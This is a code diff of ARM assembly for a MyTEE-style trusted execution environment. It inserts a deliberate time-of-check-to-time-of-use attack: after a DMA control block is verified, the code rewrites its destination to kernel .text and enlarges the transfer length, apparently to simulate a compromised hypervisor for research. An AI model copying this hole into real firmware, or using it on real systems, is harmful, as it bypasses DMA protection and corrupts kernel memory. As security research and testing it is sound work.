@@ -1379,26 +1379,41 @@ b 99f
 	// load secure buffer to r2	(DMA CB verify success)
 	ldr	r2, [sp, #MYTEE_SP_OFFSET_DMA_SECURE_BUFFER]
 	
-	// ========== TOCTOU ATTACK DEMONSTRATION ==========
-	// UNCONDITIONALLY modify CB.dst to forbidden address after verification!
-	// This demonstrates the TOCTOU vulnerability:
-	// 1. CB was verified with ALLOWED destination → PASSED
-	// 2. Now we change dst to FORBIDDEN kernel memory
-	// 3. DMA will execute with the modified CB!
+	// ==========================================================
+	// TOCTOU ATTACK - COMPROMISED HYPERVISOR SIMULATION
+	// ==========================================================
 	//
-	// CB structure in secure buffer: [info:4][src:4][dst:4][len:4][stride:4][next:4]
-	// dst is at offset 0x08
+	// ATTACK SCENARIO (as per MyTEE paper threat model):
+	//   - Attacker has compromised the hypervisor (EL2)
+	//   - This code represents malicious hypervisor behavior
+	//   - The attack exploits the TOCTOU window between
+	//     CB verification and DMA execution
+	//
+	// PROOF OF CONCEPT:
+	//   - CB was just verified with ALLOWED destination
+	//   - Now (as compromised hypervisor) we modify CB
+	//   - DMA will execute with FORBIDDEN destination
+	//   - This bypasses the DMA protection mechanism!
+	//
+	// TARGET: Kernel .text region (0x00200000 - 0x00A00000 phys)
+	//   Bus address = physical | 0xC0000000
+	//
+	// CB structure: [info:4][src:4][dst:4][len:4][stride:4][next:4]
+	// ==========================================================
 	
-	// Read current dst to log it
-	ldr	r0, [r2, #0x08]		// Original dst (should be allowed)
+	// [ATTACK] Modify dst to point to KERNEL TEXT!
+	ldr	r1, =0xC0208000		// Bus addr of 0x00208000 (inside kernel .text!)
+	str	r1, [r2, #0x08]		// Overwrite dst field with forbidden address
 	
-	// Overwrite dst with FORBIDDEN address!
-	ldr	r1, =0xC0008000		// FORBIDDEN: bus addr of 0x00008000 (kernel low memory)
-	str	r1, [r2, #0x08]		// Overwrite dst field!
+	// [ATTACK] Increase transfer length to cause more corruption
+	mov	r1, #256		// Write 256 bytes of garbage to kernel code
+	str	r1, [r2, #0x0C]		// Overwrite length field
+	
 	dmb
+	isb
 	
-	// Continue with modified CB
-	add	r2, r2, #BCM2837_BUS_VIRT_OFFSET	// change to secure buffer bus address
+	// Continue with modified CB - DMA will corrupt kernel code!
+	add	r2, r2, #BCM2837_BUS_VIRT_OFFSET
 
 	b	200f
 214:	// load saved context to r2	(verify skip)
